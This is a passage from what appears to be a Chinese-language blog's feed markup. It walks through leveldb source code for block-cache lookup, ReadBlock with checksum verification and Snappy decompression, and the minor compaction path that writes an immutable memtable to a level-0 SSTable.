class="line">        s = ReadBlock(table-&gt;rep_-&gt;file, options, handle, &amp;contents);</span><br><span class="line">        <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">          block = <span class="keyword">new</span> Block(contents);</span><br><span class="line">          <span class="keyword">if</span> (contents.cachable &amp;&amp; options.fill_cache) &#123;</span><br><span class="line">            cache_handle = block_cache-&gt;Insert(key, block, block-&gt;<span class="built_in">size</span>(),</span><br><span class="line">                                               &amp;DeleteCachedBlock);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      s = ReadBlock(table-&gt;rep_-&gt;file, options, handle, &amp;contents);</span><br><span class="line">      <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">        block = <span class="keyword">new</span> Block(contents);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">return</span> iter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码较长，分开来看，核心在</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">    BlockContents contents;</span><br><span class="line">    <span class="keyword">if</span> (block_cache != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">      <span class="keyword">char</span> cache_key_buffer[<span class="number">16</span>];</span><br><span class="line">      EncodeFixed64(cache_key_buffer, table-&gt;rep_-&gt;cache_id);</span><br><span class="line">      EncodeFixed64(cache_key_buffer + <span class="number">8</span>, handle.offset());</span><br><span class="line">      <span class="function">Slice <span class="title">key</span><span class="params">(cache_key_buffer, <span class="keyword">sizeof</span>(cache_key_buffer))</span></span>;</span><br><span class="line">      cache_handle = block_cache-&gt;Lookup(key);</span><br><span class="line">      <span class="keyword">if</span> (cache_handle != <span class="literal">nullptr</span>) &#123;<span class="comment">// 在block cache中找到了block内容</span></span><br><span class="line">        block = <span class="keyword">reinterpret_cast</span>&lt;Block*&gt;(block_cache-&gt;Value(cache_handle));</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;<span class="comment">// 找不到block内容</span></span><br><span class="line">         <span class="comment">// 从table中读取block,注意此时blockcontents的内容已经是解压后的内容</span></span><br><span class="line">        s = ReadBlock(table-&gt;rep_-&gt;file, options, handle, &amp;contents);</span><br><span class="line">        <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">          block = <span class="keyword">new</span> Block(contents);</span><br><span class="line">          <span class="keyword">if</span> (contents.cachable &amp;&amp; options.fill_cache) &#123;</span><br><span class="line">            cache_handle = block_cache-&gt;Insert(key, block, block-&gt;<span class="built_in">size</span>(),</span><br><span class="line">                                               &amp;DeleteCachedBlock);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      s = ReadBlock(table-&gt;rep_-&gt;file, options, handle, &amp;contents);</span><br><span class="line">      <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">        block = <span class="keyword">new</span> Block(contents);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果在block_cache中找到了相关的内容，则直接返回相应的Block。找不到，则从table中读取相应的Block并放入到block_cache中。可以看到，block cahce的key为一个16字节的buffer, 前8个字节存放的cache_id, 后8个字节存放的data block所在sstable中的offset。value为一个block（解压后）。</p><blockquote><p>cache id的作用：</p><p>// Return a new numeric id.  May be used by multiple clients who are</p><p>// sharing the same cache to partition the key space.  Typically the</p><p>// client will allocate a new id at startup and prepend the id to</p><p>// its cache keys.</p></blockquote><p>额外看一下Table是如何ReadBlock的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s = ReadBlock(table-&gt;rep_-&gt;file, options, handle, &amp;contents);</span><br></pre></td></tr></table></figure><h3 id="3-Table的ReadBlock"><a href="#3-Table的ReadBlock" class="headerlink" title="3. Table的ReadBlock"></a>3. Table的ReadBlock</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Status <span class="title">ReadBlock</span><span class="params">(RandomAccessFile* file, <span class="keyword">const</span> ReadOptions&amp; options,</span></span></span><br><span class="line"><span class="function"><span class="params">                 <span class="keyword">const</span> BlockHandle&amp; handle, BlockContents* result)</span> </span>&#123;</span><br><span class="line">  result-&gt;data = Slice();</span><br><span class="line">  result-&gt;cachable = <span class="literal">false</span>;</span><br><span class="line">  result-&gt;heap_allocated = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 读取完整的data block</span></span><br><span class="line">  <span class="comment">// Read the block contents as well as the type/crc footer.</span></span><br><span class="line">  <span class="comment">// See table_builder.cc for the code that built this structure.</span></span><br><span class="line">  <span class="keyword">size_t</span> n = <span class="keyword">static_cast</span>&lt;<span class="keyword">size_t</span>&gt;(handle.<span class="built_in">size</span>());</span><br><span class="line">  <span class="keyword">char</span>* buf = <span class="keyword">new</span> <span class="keyword">char</span>[n + kBlockTrailerSize];</span><br><span class="line">  Slice contents;</span><br><span class="line">  Status s = file-&gt;Read(handle.offset(), n + kBlockTrailerSize, &amp;contents, buf);</span><br><span class="line">  <span class="keyword">if</span> (!s.ok()) &#123;</span><br><span class="line">    <span class="keyword">delete</span>[] buf;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (contents.<span class="built_in">size</span>() != n + kBlockTrailerSize) &#123;</span><br><span class="line">    <span class="keyword">delete</span>[] buf;</span><br><span class="line">    <span class="keyword">return</span> Status::Corruption(<span class="string">"truncated block read"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// crc校验</span></span><br><span class="line">  <span class="comment">// Check the crc of the type and the block contents</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span>* data = contents.data();  <span class="comment">// Pointer to where Read put the data</span></span><br><span class="line">  <span class="keyword">if</span> (options.verify_checksums) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint32_t</span> crc = crc32c::Unmask(DecodeFixed32(data + n + <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint32_t</span> actual = crc32c::Value(data, n + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (actual != crc) &#123;</span><br><span class="line">      <span class="keyword">delete</span>[] buf;</span><br><span class="line">      s = Status::Corruption(<span class="string">"block checksum mismatch"</span>);</span><br><span class="line">      <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 查看是否需要解压，如果需要解压，则解压数据</span></span><br><span class="line">  <span class="keyword">switch</span> (data[n]) &#123;</span><br><span class="line">    <span class="keyword">case</span> kNoCompression:</span><br><span class="line">      <span class="keyword">if</span> (data != buf) &#123;</span><br><span class="line">        <span class="comment">// File implementation gave us pointer to some other data.</span></span><br><span class="line">        <span class="comment">// Use it directly under the assumption that it will be live</span></span><br><span class="line">        <span class="comment">// while the file is open.</span></span><br><span class="line">        <span class="keyword">delete</span>[] buf;</span><br><span class="line">        result-&gt;data = Slice(data, n);</span><br><span class="line">        result-&gt;heap_allocated = <span class="literal">false</span>;</span><br><span class="line">        result-&gt;cachable = <span class="literal">false</span>;  <span class="comment">// Do not double-cache</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        result-&gt;data = Slice(buf, n);</span><br><span class="line">        result-&gt;heap_allocated = <span class="literal">true</span>;</span><br><span class="line">        result-&gt;cachable = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Ok</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> kSnappyCompression: &#123;</span><br><span class="line">      <span class="keyword">size_t</span> ulength = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> (!port::Snappy_GetUncompressedLength(data, n, &amp;ulength)) &#123;</span><br><span class="line">        <span class="keyword">delete</span>[] buf;</span><br><span class="line">        <span class="keyword">return</span> Status::Corruption(<span class="string">"corrupted compressed block contents"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">char</span>* ubuf = <span class="keyword">new</span> <span class="keyword">char</span>[ulength];</span><br><span class="line">      <span class="keyword">if</span> (!port::Snappy_Uncompress(data, n, ubuf)) &#123;</span><br><span class="line">        <span class="keyword">delete</span>[] buf;</span><br><span class="line">        <span class="keyword">delete</span>[] ubuf;</span><br><span class="line">        <span class="keyword">return</span> Status::Corruption(<span class="string">"corrupted compressed block contents"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">delete</span>[] buf;</span><br><span class="line">      result-&gt;data = Slice(ubuf, ulength);</span><br><span class="line">      result-&gt;heap_allocated = <span class="literal">true</span>;</span><br><span class="line">      result-&gt;cachable = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">delete</span>[] buf;</span><br><span class="line">      <span class="keyword">return</span> Status::Corruption(<span class="string">"bad block type"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> Status::OK();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> leveldb </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>leveldb源码阅读记录-Compaction</title>
      <link href="/archives/1ba074b9.html"/>
      <url>/archives/1ba074b9.html</url>
      
        <content type="html"><![CDATA[<p>截至到上文，我们已经将levedb中几个重要的组件都分析了，包括log、manifest、memtable和sstable。今天将介绍leveldb中最重要的内部操作–Compaction。</p><a id="more"></a><h1 id="MemTable-到-SStable"><a href="#MemTable-到-SStable" class="headerlink" title="MemTable 到 SStable"></a>MemTable 到 SStable</h1><p>在leveldb中，compaction共有两种，分别叫 minor compaction 和major compaction。</p><ul><li>minor compaction，将immtable dump到SStable</li><li>major compaction，level之间的SSTable compaction。</li></ul><p>这里先来分析minor compaction。</p><p>我们主要关注以下问题：</p><ol><li>minor compaction是如何进行的？</li><li>minor compaction何时会进行？</li></ol><h1 id="1-minor-compaction如何进行？"><a href="#1-minor-compaction如何进行？" class="headerlink" title="1. minor compaction如何进行？"></a>1. minor compaction如何进行？</h1><p>compaction的入口是 <code>DBImpl::MaybeScheduleCompaction()</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DBImpl::MaybeScheduleCompaction</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  mutex_.AssertHeld();</span><br><span class="line">  <span class="keyword">if</span> (background_compaction_scheduled_) &#123;</span><br><span class="line">    <span class="comment">// Already scheduled</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (shutting_down_.load(<span class="built_in">std</span>::memory_order_acquire)) &#123;</span><br><span class="line">    <span class="comment">// DB is being deleted; no more background compactions</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!bg_error_.ok()) &#123;</span><br><span class="line">    <span class="comment">// Already got an error; no more changes</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (imm_ == <span class="literal">nullptr</span> &amp;&amp; manual_compaction_ == <span class="literal">nullptr</span> &amp;&amp;</span><br><span class="line">             !versions_-&gt;NeedsCompaction()) &#123;</span><br><span class="line">      <span class="comment">// 递归结束点，防止无限递归</span></span><br><span class="line">    <span class="comment">// No work to be done</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    background_compaction_scheduled_ = <span class="literal">true</span>;</span><br><span class="line">    env_-&gt;Schedule(&amp;DBImpl::BGWork, <span class="keyword">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 env_-&gt;Schedule(&amp;DBImpl::BGWork, this);中，将BGWork放入线程池，由子线程来做:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DBImpl::BGWork</span><span class="params">(<span class="keyword">void</span>* db)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">reinterpret_cast</span>&lt;DBImpl*&gt;(db)-&gt;BackgroundCall();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DBImpl::BackgroundCall</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="function">MutexLock <span class="title">l</span><span class="params">(&amp;mutex_)</span></span>;</span><br><span class="line">  assert(background_compaction_scheduled_);</span><br><span class="line">  <span class="keyword">if</span> (shutting_down_.load(<span class="built_in">std</span>::memory_order_acquire)) &#123;</span><br><span class="line">    <span class="comment">// No more background work when shutting down.</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!bg_error_.ok()) &#123;</span><br><span class="line">    <span class="comment">// No more background work after a background error.</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    BackgroundCompaction();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  background_compaction_scheduled_ = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Previous compaction may have produced too many files in a level,</span></span><br><span class="line">  <span class="comment">// so reschedule another compaction if needed.</span></span><br><span class="line">    <span class="comment">// 递归调用compaction，因为有可能这次compaction产生了过多的sst</span></span><br><span class="line">  MaybeScheduleCompaction();</span><br><span class="line">  background_work_finished_signal_.SignalAll();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-调用流程图"><a href="#1-调用流程图" class="headerlink" title="1. 调用流程图"></a>1. 调用流程图</h2><p>这里的调用链比较清晰：</p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读-copy-minor_compaction过程1 (1).png" style="zoom: 33%;" /><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读-copy-compaction (1).png" style="zoom:33%;" /><p>需要注意的是，DBImpl::MaybeScheduleCompaction 是一个递归调用，递归结束的地方在：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (imm_ == <span class="literal">nullptr</span> &amp;&amp; manual_compaction_ == <span class="literal">nullptr</span> &amp;&amp;</span><br><span class="line">             !versions_-&gt;NeedsCompaction()) &#123;</span><br><span class="line">    <span class="comment">// No work to be done</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>也就说结束的条件是：</p><ol><li><p>当前immemtable为null</p></li><li><p>非手动compaction</p></li><li><p>versionset判定为不需要compaction</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Returns true iff some level needs a compaction.</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">NeedsCompaction</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">  Version* v = current_;</span><br><span class="line">  <span class="keyword">return</span> (v-&gt;compaction_score_ &gt;= <span class="number">1</span>) || (v-&gt;file_to_compact_ != <span class="literal">nullptr</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们曾在分析VersionEdit，VersionSet时，提到过compaction_score是如何计算的，这里提一下它的入口在 VersionSet::Finalize 。后面再做详细分析。</p></li></ol><h2 id="2-Minor-Compaction执行细节"><a href="#2-Minor-Compaction执行细节" class="headerlink" title="2. Minor Compaction执行细节"></a>2. Minor Compaction执行细节</h2><p>ok，说完宏观的调用链，现在来详细分一下leveldb是如何左minor compaction的，核心函数在：==BackgroundCompaction();==</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DBImpl::BackgroundCompaction</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  mutex_.AssertHeld();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (imm_ != <span class="literal">nullptr</span>) &#123;<span class="comment">// minor compaction的触发点</span></span><br><span class="line">    CompactMemTable();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  xxx</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DBImpl::CompactMemTable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  mutex_.AssertHeld();</span><br><span class="line">  assert(imm_ != <span class="literal">nullptr</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Save the contents of the memtable as a new Table</span></span><br><span class="line">  VersionEdit edit;</span><br><span class="line">  Version* base = versions_-&gt;current();</span><br><span class="line">  base-&gt;Ref();</span><br><span class="line">   <span class="comment">// 将 数据写入到第0层（实际上不一定是第0层)</span></span><br><span class="line">  Status s = WriteLevel0Table(imm_, &amp;edit, base);</span><br><span class="line">  base-&gt;Unref();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (s.ok() &amp;&amp; shutting_down_.load(<span class="built_in">std</span>::memory_order_acquire)) &#123;</span><br><span class="line">    s = Status::IOError(<span class="string">"Deleting DB during memtable compaction"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Replace immutable memtable with the generated Table</span></span><br><span class="line">  <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">    edit.SetPrevLogNumber(<span class="number">0</span>);</span><br><span class="line">    edit.SetLogNumber(logfile_number_);  <span class="comment">// Earlier logs no longer needed</span></span><br><span class="line">      <span class="comment">// 应用生成的一个VersionEdit到当前VersionSet</span></span><br><span class="line">    s = versions_-&gt;LogAndApply(&amp;edit, &amp;mutex_);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">    <span class="comment">// Commit to the new state</span></span><br><span class="line">     <span class="comment">// 减少计数，引用计数归0时会delete当前immemtable</span></span><br><span class="line">    imm_-&gt;Unref();</span><br><span class="line">    imm_ = <span class="literal">nullptr</span>;</span><br><span class="line">    has_imm_.store(<span class="literal">false</span>, <span class="built_in">std</span>::memory_order_release);</span><br><span class="line">    RemoveObsoleteFiles();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    RecordBackgroundError(s);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们继续看==WriteLevel0Table==</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Status <span class="title">DBImpl::WriteLevel0Table</span><span class="params">(MemTable* mem, VersionEdit* edit,</span></span></span><br><span class="line"><span class="function"><span class="params">                                Version* base)</span> </span>&#123;</span><br><span class="line">  mutex_.AssertHeld();</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">uint64_t</span> start_micros = env_-&gt;NowMicros();</span><br><span class="line">  FileMetaData meta;</span><br><span class="line">  meta.number = versions_-&gt;NewFileNumber();</span><br><span class="line">  pending_outputs_.insert(meta.number);</span><br><span class="line">  Iterator* iter = mem-&gt;NewIterator();</span><br><span class="line">  Log(options_.info_log, <span class="string">"Level-0 table #%llu: started"</span>,</span><br><span class="line">      (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)meta.number);</span><br><span class="line"></span><br><span class="line">  Status s;</span><br><span class="line">  &#123;</span><br><span class="line">    mutex_.Unlock();</span><br><span class="line">      <span class="comment">//!! 1. 将memtable dump 到SSTable中</span></span><br><span class="line">    s = BuildTable(dbname_, env_, options_, table_cache_, iter, &amp;meta);</span><br><span class="line">    mutex_.Lock();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Log(options_.info_log, <span class="string">"Level-0 table #%llu: %lld bytes %s"</span>,</span><br><span class="line">      (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)meta.number, (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)meta.file_size,</span><br><span class="line">      s.ToString().c_str());</span><br><span class="line">  <span class="keyword">delete</span> iter;</span><br><span class="line">  pending_outputs_.erase(meta.number);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Note that if file_size is zero, the file has been deleted and</span></span><br><span class="line">  <span class="comment">// should not be added to the manifest.</span></span><br><span class="line">  <span class="keyword">int</span> level = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (s.ok() &amp;&amp; meta.file_size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> Slice min_user_key = meta.smallest.user_key();</span><br><span class="line">    <span class="keyword">const</span> Slice max_user_key = meta.largest.user_key();</span><br><span class="line">    <span class="keyword">if</span> (base != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        <span class="comment">// 2.SSTable 应该写入到哪个level？</span></span><br><span class="line">      level = base-&gt;PickLevelForMemTableOutput(min_user_key, max_user_key);</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="comment">// 3. 生成VersionEdit，给后序Manifest做记录</span></span><br><span class="line">    edit-&gt;AddFile(level, meta.number, meta.file_size, meta.smallest,</span><br><span class="line">                  meta.largest);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 保存本次compaction所在level的 compaction状态</span></span><br><span class="line">  CompactionStats stats;</span><br><span class="line">  stats.<span class="built_in">micros</span> = env_-&gt;NowMicros() - start_micros;</span><br><span class="line">  stats.bytes_written = meta.file_size;</span><br><span class="line">  stats_[level].Add(stats);</span><br><span class="line">  <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-WriteLevel0Table-流程图"><a href="#1-WriteLevel0Table-流程图" class="headerlink" title="1 WriteLevel0Table 流程图"></a>1 WriteLevel0Table 流程图</h3><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读-copy-WriteLevel0Table.png" style="zoom:50%;" /><h4 id="3个函数的分析"><a href="#3个函数的分析" class="headerlink" title="3个函数的分析"></a>3个函数的分析</h4><p>现在来分别分析这3个函数：</p><h4 id="1-BuildTable-建立ssttable并持久化"><a href="#1-BuildTable-建立ssttable并持久化" class="headerlink" title="1. BuildTable (建立ssttable并持久化)"></a>1. BuildTable (建立ssttable并持久化)</h4><p>下面这些 .ldb的文件就是sstable，可以看到它们都是一些由数字组成的文件名，这些数字是哪里来的？我们可以从源码中获得答案：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200925153434477.png" alt="image-20200925153434477"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 